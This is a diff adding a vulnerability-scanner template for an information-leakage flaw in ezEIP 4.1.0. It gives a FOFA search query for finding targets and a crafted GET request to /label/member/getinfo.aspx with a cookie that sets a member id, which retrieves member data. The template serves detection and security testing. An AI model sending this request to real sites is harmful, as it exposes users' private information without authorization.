@@ -1,0 +1,21 @@
+id: ezEIP-Information-leakage
+
+info:
+  name: ezEIP 4.1.0 信息泄露漏洞
+  author: daffainfo
+  severity: critical
+  description: |
+    ezEIP 4.1.0 存在信息泄露漏洞，通过遍历Cookie中的参数值获取敏感信息
+    fofa-query: "ezEIP"
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/ezEIP%204.1.0%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /label/member/getinfo.aspx
+      headers:
+        Cookie: WHIR_USERINFOR=whir_mem_member_pid=1;
+    expression: response.status == 200 && response.body.bcontains(b'"Key":') && response.body.bcontains(b'"Value":')
+expression: r0()
